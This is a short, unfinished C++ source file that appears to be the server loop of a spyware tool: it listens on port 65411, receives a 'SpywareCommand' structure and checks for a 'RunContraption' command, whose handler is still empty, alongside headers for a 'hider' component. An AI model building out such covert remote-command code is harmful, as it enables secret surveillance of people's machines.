#include <iostream>

#include "../Maneger/Connection.h"
#include "../IncludeCPP/Status.h"

#include "HiderManeger.h"
#include "HiderCodes.h"
#include "Listener.h"
#include "Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"

#define PORT (65411)

void loopIter(Connection& conn, HiderManeger& hiderManeger);


int main() {
    
    HiderManeger hiderManager = HiderManeger();
    Listener listener = Listener(PORT);

    bool cont = true;
    while (cont)
    {
        Connection conn;
        // TODO add error strtegy
        if (listener.acceptConnection(conn) == -1) {
            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
            sleep(10);
            continue;
        }
        loopIter(conn, hiderManager);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}



void loopIter(Connection& conn, HiderManeger& hiderManeger)
{
    SpywareCommand cmd;

    conn.recvData(sizeof(cmd), (char*)&cmd);

    if(cmd.cmdType == RunContraption)
    {
        // switch(cmd.cmdType) {
        // case 
        // }
    }
}
